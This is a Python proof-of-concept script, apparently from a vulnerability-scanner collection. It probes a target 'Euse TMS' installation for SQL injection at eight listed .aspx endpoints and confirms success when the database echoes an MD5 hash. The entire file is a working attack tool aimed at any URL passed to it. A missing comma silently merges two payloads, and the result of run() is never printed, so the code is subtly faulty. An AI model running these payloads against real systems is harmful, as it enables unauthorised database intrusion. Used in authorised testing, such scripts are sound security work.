#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Euse TMS存在多处DBA权限SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0135012
author: Lucifer
description: 多处存在SQL注入。
'''
import sys
import requests



class euse_study_multi_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payloads = ["/euseinfo.aspx?id=1 And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
                    "/repoort/smartuser.aspx?di=1'And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
                    "/Course/allcoursecomment.aspx?type=1 And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
                    "/Knowledge/PersonalQuestionsList.aspx?userid=1 And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
                    "/Course/CourseCommentList.aspx?type=2&targetid='And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
                    "/Plan/plancommentlist.aspx?type=3 And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--&targetid=1"
                    "/NewPortal/download.aspx?fileid=1%27AnD%20Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0%20AnD%27%%27=%27%", 
                    "/NewPortal/content_show.aspx?contentid=1%27AnD%20Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0%20AnD%27%%27=%27%"]
        try:
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    return "[+]存在Euse TMS DBA权限SQL注入...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = euse_study_multi_sqli_BaseVerify(sys.argv[1])
    testVuln.run()